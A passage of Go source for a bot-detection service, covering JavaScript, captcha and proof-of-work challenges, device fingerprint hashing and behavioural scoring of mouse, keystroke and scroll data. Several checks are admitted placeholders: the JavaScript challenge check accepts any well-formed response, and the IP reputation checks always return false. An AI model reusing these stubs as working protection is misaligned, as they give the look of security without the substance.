				behavior.ScrollEvents = append(behavior.ScrollEvents, event)
			}
		}
	}

	return behavior
}

func (bg *BotGuard) generateJavaScriptChallenge(sessionID string) string {
	challenges := []string{
		fmt.Sprintf(`
var challenge_%s = {
    solve: function() {
        var start = Date.now();
        var result = 0;
        for(var i = 0; i < 100000; i++) {
            result += Math.sin(i) * Math.cos(i);
        }
        var end = Date.now();
        return {
            result: Math.floor(result * 1000) %% 10000,
            time: end - start,
            timestamp: Date.now()
        };
    }
};`, sessionID),

		fmt.Sprintf(`
var challenge_%s = {
    solve: function() {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#FF0000';
        ctx.fillRect(0, 0, 100, 100);
        var data = canvas.toDataURL();
        return {
            hash: data.substr(-10),
            timestamp: Date.now()
        };
    }
};`, sessionID),

		fmt.Sprintf(`
var challenge_%s = {
    solve: function() {
        var start = performance.now();
        var arr = [];
        for(var i = 0; i < 1000; i++) {
            arr.push(Math.random());
        }
        arr.sort();
        var end = performance.now();
        return {
            checksum: arr[0] + arr[999],
            time: Math.floor(end - start),
            timestamp: Date.now()
        };
    }
};`, sessionID),
	}

	// Select random challenge
	index := bg.generateRandomInt(len(challenges))
	return challenges[index]
}

func (bg *BotGuard) verifyCaptcha(challenge *Challenge, response map[string]interface{}) bool {
	if answer, ok := response["answer"].(string); ok {
		return answer == challenge.ExpectedAnswer
	}
	return false
}

func (bg *BotGuard) verifyJavaScriptChallenge(challenge *Challenge, response map[string]interface{}) bool {
	// Verify JavaScript challenge response
	if result, ok := response["result"]; ok {
		if resMap, ok := result.(map[string]interface{}); ok {
			// Check if response contains expected fields
			if _, hasResult := resMap["result"]; hasResult {
				if _, hasTime := resMap["time"]; hasTime {
					if _, hasTimestamp := resMap["timestamp"]; hasTimestamp {
						// Basic validation - in real implementation, verify the actual computation
						return true
					}
				}
			}
		}
	}
	return false
}

func (bg *BotGuard) verifyBehavioralChallenge(challenge *Challenge, response map[string]interface{}) bool {
	// Verify behavioral patterns in response
	if behaviorData, ok := response["behavior"].(map[string]interface{}); ok {
		if movements, ok := behaviorData["mouse_movements"].([]interface{}); ok {
			// Check for natural mouse movements
			if len(movements) > 10 {
				return true
			}
		}
	}
	return false
}

func (bg *BotGuard) verifyProofOfWork(challenge *Challenge, response map[string]interface{}) bool {
	if nonce, ok := response["nonce"].(string); ok {
		// Verify proof of work
		hash := fmt.Sprintf("%x", sha256.Sum256([]byte(challenge.Question+nonce)))
		difficulty := 4 // Number of leading zeros required

		if challenge.Difficulty == "hard" {
			difficulty = 6
		} else if challenge.Difficulty == "easy" {
			difficulty = 2
		}

		prefix := strings.Repeat("0", difficulty)
		return strings.HasPrefix(hash, prefix)
	}
	return false
}

func (bg *BotGuard) backgroundCleanup() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			bg.mu.Lock()

			// Clean up expired sessions
			for sessionID, session := range bg.sessions {
				if time.Since(session.LastActivity).Hours() > 24 {
					delete(bg.sessions, sessionID)
				}
			}

			// Clean up expired challenges
			for challengeID, challenge := range bg.challenges {
				if time.Now().After(challenge.ExpiresAt) {
					delete(bg.challenges, challengeID)
				}
			}

			// Clean up old IP reputation data
			for ip, rep := range bg.ipReputation {
				if time.Since(rep.LastChecked).Hours() > 168 { // 1 week
					delete(bg.ipReputation, ip)
				}
			}

			bg.mu.Unlock()
		}
	}
}

func (ba *BehaviorAnalyzer) AnalyzeBehavior(behavior *BehaviorData) *BehaviorAnalysisResult {
	result := &BehaviorAnalysisResult{
		HumanLike: true,
		Score:     100.0,
		Anomalies: []string{},
	}

	// Analyze mouse movements
	if len(behavior.MouseMovements) == 0 {
		result.Score -= 30
		result.Anomalies = append(result.Anomalies, "NO_MOUSE_MOVEMENT")
	} else {
		if ba.analyzeMousePatterns(behavior.MouseMovements) {
			result.Score -= 20
			result.Anomalies = append(result.Anomalies, "ROBOTIC_MOUSE_PATTERN")
		}
	}

	// Analyze keystrokes
	if len(behavior.Keystrokes) > 0 {
		if ba.analyzeTypingPatterns(behavior.Keystrokes) {
			result.Score -= 15
			result.Anomalies = append(result.Anomalies, "ROBOTIC_TYPING_PATTERN")
		}
	}

	// Analyze scroll behavior
	if len(behavior.ScrollEvents) > 0 {
		if ba.analyzeScrollPatterns(behavior.ScrollEvents) {
			result.Score -= 10
			result.Anomalies = append(result.Anomalies, "UNNATURAL_SCROLL_PATTERN")
		}
	}

	// Analyze timing
	if behavior.TimingData != nil {
		if ba.analyzeTimingPatterns(behavior.TimingData) {
			result.Score -= 25
			result.Anomalies = append(result.Anomalies, "SUSPICIOUS_TIMING")
		}
	}

	if result.Score < 50 {
		result.HumanLike = false
	}

	behavior.BehaviorScore = int(result.Score)
	behavior.HumanLikeScore = result.Score / 100.0

	return result
}

// Helper methods for bot detection
func (bg *BotGuard) generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[num.Int64()]
	}
	return string(b)
}

func (bg *BotGuard) generateRandomInt(max int) int {
	num, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(num.Int64())
}

func (bg *BotGuard) generateMathCaptcha(difficulty string) (string, string) {
	var a, b int
	var operation string

	switch difficulty {
	case "easy":
		a = bg.generateRandomInt(10) + 1
		b = bg.generateRandomInt(10) + 1
		operation = "+"
	case "medium":
		a = bg.generateRandomInt(50) + 1
		b = bg.generateRandomInt(50) + 1
		ops := []string{"+", "-", "*"}
		operation = ops[bg.generateRandomInt(len(ops))]
	case "hard":
		a = bg.generateRandomInt(100) + 1
		b = bg.generateRandomInt(100) + 1
		ops := []string{"+", "-", "*", "/"}
		operation = ops[bg.generateRandomInt(len(ops))]
		if operation == "/" {
			a = a * b // Ensure clean division
		}
	default:
		a = bg.generateRandomInt(20) + 1
		b = bg.generateRandomInt(20) + 1
		operation = "+"
	}

	var result int
	switch operation {
	case "+":
		result = a + b
	case "-":
		result = a - b
	case "*":
		result = a * b
	case "/":
		result = a / b
	}

	question := fmt.Sprintf("What is %d %s %d?", a, operation, b)
	answer := strconv.Itoa(result)

	return question, answer
}

func (bg *BotGuard) generateProofOfWorkChallenge(difficulty string) (string, string) {
	challenge := bg.generateRandomString(16)
	return challenge, "" // Answer will be computed by client
}

func (bg *BotGuard) generateFingerprintHash(fp *DeviceFingerprint) string {
	data := fmt.Sprintf("%s|%s|%d|%s|%s|%s|%v|%d",
		fp.ScreenResolution, fp.Language, fp.ColorDepth, fp.Timezone,
		fp.Platform, fp.WebGLRenderer, fp.TouchSupport, fp.HardwareConcurrency)

	hash := sha256.Sum256([]byte(data))
	return fmt.Sprintf("%x", hash)
}

func (bg *BotGuard) isDataCenterIP(ip string) bool {
	// Simplified datacenter IP detection
	// datacenters := []string{"amazonaws.com", "googlecloud.com", "azure.com", "digitalocean.com"}
	// In real implementation, use IP range databases
	return false
}

func (bg *BotGuard) isTorExitNode(ip string) bool {
	// Simplified Tor detection - in real implementation, query Tor directory
	return false
}

func (bg *BotGuard) isKnownVPN(ip string) bool {
	// Simplified VPN detection - in real implementation, use VPN IP databases
	return false
}

func (bg *BotGuard) getCountryCode(ip string) string {
	// Simplified geolocation - in real implementation, use GeoIP database
	return "US"
}

func (bg *BotGuard) getHeaderOrder(r *http.Request) []string {
	var order []string
	for name := range r.Header {
		order = append(order, name)
	}
	return order
}

func (bg *BotGuard) isSuspiciousHeaderOrder(order []string) bool {
	// Check if headers are in suspicious order
	return false
}

func (ba *BehaviorAnalyzer) analyzeMousePatterns(movements []MouseEvent) bool {
	if len(movements) < 2 {
		return false
	}

	// Check for perfectly straight lines (robotic movement)
	straightLines := 0
	for i := 1; i < len(movements)-1; i++ {
		prev := movements[i-1]
		curr := movements[i]
		next := movements[i+1]

		// Check if three consecutive points form a straight line
		if (curr.X-prev.X)*(next.Y-curr.Y) == (next.X-curr.X)*(curr.Y-prev.Y) {
			straightLines++
		}
	}

	// If more than 50% of movements are straight lines, likely robotic
	return float64(straightLines)/float64(len(movements)) > 0.5
}

func (ba *BehaviorAnalyzer) analyzeTypingPatterns(keystrokes []KeystrokeEvent) bool {
	if len(keystrokes) < 5 {
		return false
	}

	// Calculate intervals between keystrokes
	intervals := []int{}
	for i := 1; i < len(keystrokes); i++ {
		interval := int(keystrokes[i].Timestamp.Sub(keystrokes[i-1].Timestamp).Milliseconds())
		intervals = append(intervals, interval)
	}

	// Check for too consistent timing (robotic)
	if len(intervals) > 0 {
		variance := ba.calculateVariance(intervals)
		return variance < 100 // Very low variance suggests automation
	}

	return false
}

func (ba *BehaviorAnalyzer) analyzeScrollPatterns(scrolls []ScrollEvent) bool {
	if len(scrolls) < 3 {
		return false
	}

	// Check for perfectly regular scroll intervals
	intervals := []float64{}
	for i := 1; i < len(scrolls); i++ {
		interval := scrolls[i].Timestamp.Sub(scrolls[i-1].Timestamp).Seconds()
		intervals = append(intervals, interval)
	}

	if len(intervals) > 0 {
		variance := ba.calculateVarianceFloat(intervals)
		return variance < 0.01 // Very consistent scrolling suggests automation
	}

	return false
}

func (ba *BehaviorAnalyzer) analyzeTimingPatterns(timing *TimingData) bool {
	// Check for suspiciously fast interactions
	if timing.FirstInteraction < 100 { // Less than 100ms
		return true
	}

	// Check for too consistent action delays
	if timing.AverageActionDelay > 0 && timing.AverageActionDelay < 50 {
		return true
	}

	return false
}

func (ba *BehaviorAnalyzer) calculateVariance(data []int) float64 {
	if len(data) == 0 {
		return 0
	}

	// Calculate mean
	sum := 0
	for _, v := range data {
		sum += v
	}
	mean := float64(sum) / float64(len(data))

	// Calculate variance
	sumSquares := 0.0
	for _, v := range data {
		diff := float64(v) - mean
		sumSquares += diff * diff
	}

	return sumSquares / float64(len(data))
}

func (ba *BehaviorAnalyzer) calculateVarianceFloat(data []float64) float64 {
	if len(data) == 0 {
		return 0
	}

	// Calculate mean
	sum := 0.0
	for _, v := range data {
		sum += v
	}
	mean := sum / float64(len(data))

	// Calculate variance
	sumSquares := 0.0
	for _, v := range data {
		diff := v - mean
		sumSquares += diff * diff
	}

	return sumSquares / float64(len(data))
}
